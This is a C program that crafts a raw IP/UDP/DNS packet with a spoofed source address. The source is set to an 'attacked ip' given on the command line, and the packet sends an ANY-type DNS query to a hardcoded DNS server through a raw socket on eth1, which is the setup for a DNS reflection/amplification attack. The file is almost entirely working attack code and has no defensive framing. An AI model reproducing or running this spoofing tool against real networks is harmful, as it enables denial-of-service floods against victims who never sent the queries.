#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <linux/if.h>
#include <sys/ioctl.h>

#define IPHEAD_LEN       20
#define UDPHEAD_LEN      8
#define DNS_LEN          12
#define DNSQUERY_LEN     4
#define SENDBUF_LEN      256
#define IPUDPHEAD_LEN    (IPHEAD_LEN + UDPHEAD_LEN)
#define IPUDPDNSHEAD_LEN (IPUDPHEAD_LEN + DNS_LEN)
#define DNSSERVERIP      "10.20.0.98"
#define VSTRONG_PROTOCOL 0x0807

typedef struct tag_IPHead
{
    unsigned char  ucVerLen;
    unsigned char  ucTos;
    unsigned short usTotalLen;
    unsigned short usIdentity;
    unsigned short usFlags;
    unsigned char  ucTTL;
    unsigned char  ucProtocol;
    unsigned short usCkSum;
    unsigned int   uiSrcIP;
    unsigned int   uiDstIP;
}IPHEAD_S;

typedef struct tag_UDPHead
{
    unsigned short usSrcPort;
    unsigned short usDstPort;
    unsigned short usUDPLen;
    unsigned short usUDPCkSum;
}UDPHEAD_S;

typedef struct tag_DNS
{
    unsigned short usIdentity;
    unsigned short usFlags;
    unsigned short usQuestionNum;
    unsigned short usResourceNum;
    unsigned short usAuthority;
    unsigned short usAdditional;
}DNS_S;

typedef struct tag_Query
{
    unsigned short usType;
    unsigned short usClass;
}QUERY_S;

unsigned short in_cksum(unsigned short *addr, int len) 
{ 
    int sum=0; 
    unsigned short res=0; 

    while (len > 1)  
    { 
        sum += *addr++; 
        len -=2; 
    } 
    
    if (len == 1) 
    { 
        *((unsigned char *)(&res))=*((unsigned char *)addr); 
        sum += res; 
    }
 
    sum = (sum >>16) + (sum & 0xffff); 
    sum += (sum >>16) ; 
    res = ~sum; 

    return res; 
} 

int generateQueryName(const char *pSrc, char *pDst, unsigned uiDstLen, unsigned *uiSrcLen)
{
    int i = 0;
    int j = 0;
    int start = 0;

    if ((NULL == pDst) || (NULL == pSrc)) {
        return -1;
    }

    if (strlen(pSrc) >= uiDstLen) {
        printf("buf too short...\r\n");
        return -1;
    }

    for (; i < strlen(pSrc); i++) {
        if ('.' == pSrc[i]) {
            pDst[j] = i - j;
            j++;

            for (; start < i; start++) {
                pDst[j++] = pSrc[start];
            }
            start++;
        }
    }

    pDst[j] = i - j;
    j++;

    for (; start < i; start++) {
        pDst[j++] = pSrc[start];
    }

    pDst[j++] = '\0';
    *uiSrcLen = j;

    return 0;
}

void formatIP(IPHEAD_S *pstIPHead, unsigned uiTotalLen, unsigned uiAttackIP)
{
    assert(NULL != pstIPHead);

    pstIPHead->ucVerLen   = 0x45;
    pstIPHead->ucTos      = 0;
    pstIPHead->usTotalLen = htons(uiTotalLen);
    pstIPHead->usIdentity = 0;
    pstIPHead->usFlags    = 0x0040;
    pstIPHead->ucTTL      = 64;
    pstIPHead->ucProtocol = 17;
    pstIPHead->uiSrcIP    = uiAttackIP;
    pstIPHead->uiDstIP    = (unsigned int)inet_addr(DNSSERVERIP);
    pstIPHead->usCkSum    = in_cksum((unsigned short *)pstIPHead, (int)uiTotalLen);

    return;
}

void formatUDP(UDPHEAD_S *pstUDPHead, unsigned uiUDPLen)
{
    assert(NULL != pstUDPHead);

    pstUDPHead->usSrcPort  = htons(12880);
    pstUDPHead->usDstPort  = htons(53);
    pstUDPHead->usUDPLen   = htons(uiUDPLen);
    pstUDPHead->usUDPCkSum = in_cksum((unsigned short *)pstUDPHead, (int)uiUDPLen);

    return;
}

void formatDNS(DNS_S *pstDNS)
{
    assert(NULL != pstDNS);

    pstDNS->usIdentity    = htons(0xe31d);
    pstDNS->usFlags       = htons(0x0100);
    pstDNS->usQuestionNum = htons(0x0001);
    pstDNS->usResourceNum = 0;
    pstDNS->usAuthority   = 0;
    pstDNS->usAdditional  = 0;

    return;
}

int formatPackage(char *pPackage, char *pDomain, unsigned uiAttackedIP, unsigned *uiPackageLen)
{
    unsigned uiQueryLen = 0;
    QUERY_S *pstQuery = NULL;

    if ((NULL == pPackage) || (NULL == uiPackageLen) || (NULL == pDomain)) {
        return -1;
    }

    if (-1 == generateQueryName(pDomain, pPackage + IPUDPDNSHEAD_LEN, SENDBUF_LEN - IPUDPDNSHEAD_LEN, &uiQueryLen)) {
        printf("generateQueryName() error...\r\n");
        return -1;
    }

    pstQuery = (QUERY_S *)(pPackage + IPUDPDNSHEAD_LEN + uiQueryLen);
    pstQuery->usType  = htons(0x00ff);
    pstQuery->usClass = htons(0x0001);

    formatDNS((DNS_S *)(pPackage + IPUDPHEAD_LEN));
    formatUDP((UDPHEAD_S *)(pPackage + IPHEAD_LEN), UDPHEAD_LEN + DNS_LEN + uiQueryLen + DNSQUERY_LEN);

    *uiPackageLen = IPUDPDNSHEAD_LEN + uiQueryLen + DNSQUERY_LEN;
    formatIP((IPHEAD_S *)pPackage, *uiPackageLen, uiAttackedIP);

    return 0;
}

int main(int argc, char *argv[])
{
    int i                     = 0;
    int opt                   = 0;
    int optval                = 1;
    int sockfd                = 0;
    int result                = 0;
    struct sockaddr_in connection;
    unsigned uiPackageLen     = 0;
    char sendBuf[SENDBUF_LEN] = {0};
    /* struct sockaddr_ll stTagAddr; */
    struct ifreq Interface;
    /* int ret;
    struct ifreq req;
    int sd; */

    if (-1 != (opt = getopt(argc, argv, "h"))) {
        switch (opt) {
            case 'h':
                printf("arg num: 2, argv[1]: domain, argv[2]: attacked ip\r\n");
            default:
                return 0;
        }
    }

    if (argc != 3)
    {
        printf("args error...\r\n");
        return -1;
    }

    if (INADDR_NONE == inet_addr(argv[2]))
    {
        printf("dst address invalid...\r\n");
        return -1;
    }

    /* memset(&stTagAddr, 0 , sizeof(stTagAddr));
    stTagAddr.sll_family    = AF_PACKET;//填写AF_PACKET,不再经协议层处理
    stTagAddr.sll_protocol  = htons(VSTRONG_PROTOCOL);
    sd = socket(PF_INET, SOCK_DGRAM, 0);//这个sd就是用来获取eth0的index，完了就关闭
    strncpy(req.ifr_name, "eth1", 4);//通过设备名称获取index
    ret=ioctl(sd, SIOCGIFINDEX, &req);
   
    close(sd);
    if (ret == -1) {
        perror("ioctl error");
        return -1;
    }

    stTagAddr.sll_ifindex   = req.ifr_ifindex;//网卡eth0的index，非常重要，系统把数据往哪张网卡上发，就靠这个标识
    stTagAddr.sll_pkttype   = PACKET_OUTGOING;//标识包的类型为发出去的包
    stTagAddr.sll_halen     = 6;    //目标MAC地址长度为6
    //填写目标MAC地址
    stTagAddr.sll_addr[0]   = 0x00;
    stTagAddr.sll_addr[1]   = 0x24;
    stTagAddr.sll_addr[2]   = 0xc4;
    stTagAddr.sll_addr[3]   = 0xc0;
    stTagAddr.sll_addr[4]   = 0x67;
    stTagAddr.sll_addr[5]   = 0x00; */

    if (-1 == formatPackage(sendBuf, argv[1], (unsigned)(inet_addr(argv[2])), &uiPackageLen)) {
        printf("formatPackage() error...\r\n");
        return -1;
    }
    
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (-1 == sockfd)
    {
        perror("socket error");
        return -1;
    }

    memset(&Interface, 0, sizeof(Interface)); 
    strncpy(Interface.ifr_ifrn.ifrn_name, "eth1", IFNAMSIZ); 
    if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, &Interface, sizeof(Interface)) < 0) {
        perror("setsockopt() 1 error");
        close(sockfd);
        return -1;
    }

    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(int)) < 0) {
        perror("setsockopt() 2 error");
        close(sockfd);
        return -1;
    }

    connection.sin_family = AF_INET;
    connection.sin_addr.s_addr = inet_addr(argv[2]);
   
    for (; i < 1; i++) { 
        result = sendto(sockfd, sendBuf, uiPackageLen, 0, (struct sockaddr *)&connection, sizeof(struct sockaddr));
        if (-1 == result) {
            perror("sendto error");
            close(sockfd);
            return -1;
        }
    }

    close(sockfd);

    return 0;
}
